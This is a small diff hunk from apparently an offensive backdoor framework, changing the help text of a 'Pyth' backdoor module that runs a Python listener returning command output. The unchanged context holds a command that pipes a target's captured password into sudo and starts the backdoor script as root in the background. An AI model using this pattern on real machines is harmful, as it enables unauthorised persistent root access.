@@ -12,7 +12,7 @@ class Pyth(Backdoor):
                 }
         self.modules = {}
         self.allow_modules = True
-        self.help_text = "" 
+        self.help_text = INFO + "Uses a short python script to listen for commands and send output back to the user." 
 
     def get_command(self):
         return  "echo " + self.core.curtarget.pword + " | sudo -S nohup python ~/pythBackdoor.py"
